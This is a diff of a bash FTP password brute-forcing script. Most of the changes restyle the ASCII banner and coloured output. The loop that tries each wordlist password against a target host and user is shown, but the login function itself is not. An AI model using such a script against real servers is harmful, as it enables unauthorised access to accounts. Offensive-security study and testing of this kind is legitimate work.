@@ -9,27 +9,27 @@
 
 function_banner(){
 
-cat << EOF
+#cat << EOF
 
+echo 
+echo -e "${red}  ▄▄▄▄     █████▒ █████▒▄▄▄█████▓ ██▓███   "
+echo -e "${red} ▓█████▄ ▓██   ▒▓██   ▒ ▓  ██▒ ▓▒▓██░  ██▒ "
+echo -e "${red} ▒██▒ ▄██▒████ ░▒████ ░ ▒ ▓██░ ▒░▓██░ ██▓▒ "
+echo -e "${red} ▒██░█▀  ░▓█▒  ░░▓█▒  ░ ░ ▓██▓ ░ ▒██▄█▓▒ ▒ "
+echo -e "${red} ░▓█  ▀█▓░▒█░   ░▒█░      ▒██▒ ░ ▒██▒ ░  ░ "
+echo -e "${red} ░▒▓███▀▒ ▒ ░    ▒ ░      ▒ ░░   ▒▓▒░ ░  ░ "
+echo -e "${red} ▒░▒   ░  ░      ░          ░    ░▒ ░      "
+echo -e "${red}  ░    ░  ░ ░    ░ ░      ░      ░░        "
+echo -e "${red}  ░                                        "
+echo -e "${red}       ░${white}    Author: João Lucas	  "
 
-88            ad88    ad88
-88           d8V     d8V     ,d
-88           88      88      88
-88,dPPYba, x0BRUTE x0FORCE x0FTPxz 8b,dPPYba,
-88P'    "8a  88      88      88    88P     V8a
-88       d8  88      88      88    88       d8
-88b,   ,a8V  88      88      88,   88b,   ,a8n
-8YVYbbd8VN   88      88      VY888 88ddYbbdPV
-                                   88
-	Author: João Lucas         88
-
-EOF
+#EOF
 
 }
 
 
 function_usage() {
-	cat << EOF
+cat << EOF
 
 Simple script to brute force in protocol ftp
 
@@ -71,7 +71,6 @@ else
 	return 0
 fi
 
-
 }
 
 while getopts t:w:u: opt; do
@@ -91,19 +90,20 @@ done
 function_colors;
 function_banner;
 
-echo -e "\n x0[${blue}  TARGET  ${white}]: $host\n x0[${blue}   USER   ${white}]: $user\n x0[${blue} WORDLIST ${white}]: `wc -l $wordlist | awk '{print $1}'` \n"
-
+echo -e "\n ${yellow} ------------------------------------"
+echo -e "\n ${white}x0[${blue}  TARGET  ${white}]: $host\n x0[${blue}   USER   ${white}]: $user\n x0[${blue} WORDLIST ${white}]: `wc -l $wordlist | awk '{print $1}'` \n"
+echo -e " ${yellow} ------------------------------------ \n"
 
 
 for password in $(cat $wordlist); do
-	echo -e "[${yellow}  TEST  ${white}]${white} Testing the password: ${cyan} $password"
+	echo -e "${white}[${yellow}  TEST  ${white}]${white} Testing the password: ${cyan} $password"
 	test=$(function_bfftp $host $user $password)
 	result=$(echo $?)
 
-	if test $result -eq 1; then
-		echo -e "[${red} FAILED ${white}] Password incorrect! \n"
+	if [ $result = 1 ]; then
+		echo -e "${white}[${red} FAILED ${white}] Password incorrect! \n"
 	else
-		echo -e "[${green}   OK   ${white}] Password correct: ${green} $password"
+	echo -e "${white}[${green}   OK   ${white}] Password correct: ${green} $password \n"
 		break
 	fi
 done
